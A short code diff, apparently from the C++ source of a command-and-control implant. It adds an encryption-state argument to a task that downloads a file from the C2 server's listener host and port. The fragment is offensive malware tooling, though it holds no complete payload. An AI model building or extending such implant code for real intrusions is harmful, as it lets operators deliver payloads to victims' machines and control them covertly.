@@ -9,6 +9,7 @@ namespace Task
         // Download a specified file from the C2 server.
         BOOL bResult = System::Http::DownloadFile(
             pState->pProcs,
+            pState->pCrypt,
             pState->hConnect,
             pState->lpListenerHost,
             pState->nListenerPort,
